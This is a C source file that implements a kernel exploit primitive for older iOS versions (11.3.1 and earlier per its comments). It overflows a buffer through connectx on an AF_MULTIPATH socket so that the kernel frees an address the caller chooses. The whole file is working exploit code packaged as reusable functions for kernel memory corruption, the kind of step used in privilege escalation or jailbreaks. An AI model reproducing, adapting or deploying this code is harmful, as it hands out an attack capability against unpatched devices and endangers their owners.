//
//  multipath_kfree.h
//  multipath_kfree
//
//  Created by John Åkerblom on 6/1/18.
//

#include "multipath_kfree.h"

#include <netinet/in.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef AF_MULTIPATH
#define AF_MULTIPATH 39
#endif

#define MULTIPATH_ERRNO_CHECK // Enable rudimentary error checking. Not thread-safe.
#ifdef MULTIPATH_ERRNO_CHECK
#include <errno.h>
#endif

#pragma pack(push, 1)
struct not_todescos_not_essers_ipc_object
{
    uint8_t zeroes[132-88];     // Unused by us
    uint32_t mpte_itfinfo_size; // If > 4, ->mpte_itfinfo free'd
    uint8_t nonzeroes[168-136]; // Unused by us
    uint8_t nonzeroes2[16];     // Unused by us
    uint64_t mpte_itfinfo;      // Address to free
};
#pragma pack(pop)

static void _multipath_connectx_overflow(int sock, void *buf, size_t n)
{
    struct sockaddr_in *sa_dst = calloc(1, 0x4000);
    memset(sa_dst, 0x0, 0x4000);
    memcpy(sa_dst, buf, n);
    sa_dst->sin_family = AF_UNSPEC;
    sa_dst->sin_len = n;
    
    struct sockaddr_in sa_src;
    memset(&sa_src, 0, sizeof(sa_src));
    sa_src.sin_family = AF_INET;
    sa_src.sin_len = 255;
    
    sa_endpoints_t sae;
    sae.sae_srcif = 0;
    sae.sae_srcaddr = (struct sockaddr *)&sa_src;
    sae.sae_srcaddrlen = 255;
    sae.sae_dstaddr = (struct sockaddr *)sa_dst;
    sae.sae_dstaddrlen = (socklen_t)n;
    
#ifdef MULTIPATH_ERRNO_CHECK
    errno = 0;
#endif
    
    // Trigger overflow
    connectx(sock, &sae, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
    
    // We expect return value -1, errno 22 on success (but they don't guarantee it)
    
#ifdef MULTIPATH_ERRNO_CHECK
    if (errno == 1) {
        // Protip: Apple actually charges more than $100 for some regions (RIP 1000 SEK)
        *(int *)("You") = (int)"need to pay Apple $100 (add the multipath entitlement)";
    }
    else if (errno == 47) {
        *(int *)("You") = (int)"need to find another bug (iOS <= 11.3.1 only)";
    }
#endif
    
    free(sa_dst);
}

static void _multipath_kfree(int sock, uint64_t addr, size_t addr_size)
{
    struct not_todescos_not_essers_ipc_object s;
    memset(&s, 0x00, sizeof(s));
    memset(&s.nonzeroes, 0x42, sizeof(s.nonzeroes));
    //memset(&_s1.nonzeroes2, 0x42, sizeof (_s.nonzeroes2)); // Irrelevant
    s.mpte_itfinfo_size = 8; // > 4
    s.mpte_itfinfo = addr; // Address to free
    
    _multipath_connectx_overflow(sock, &s, sizeof(s) - sizeof(s.mpte_itfinfo) + addr_size);
    
    // Close for cleanup by GC
    close(sock);
}

/* multipath_kfree: cause GC to free a kernel address. */
void multipath_kfree(uint64_t addr)
{
    int mp_sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    _multipath_kfree(mp_sock, addr, sizeof(addr));
}

/* multipath_kfree_nearby_self: cause GC to free a "nearby" kernel address.
   NOTE: closes mp_sock */
void multipath_kfree_nearby_self(int mp_sock, uint16_t addr_lowest_part)
{
   _multipath_kfree(mp_sock, addr_lowest_part, sizeof(addr_lowest_part));
}
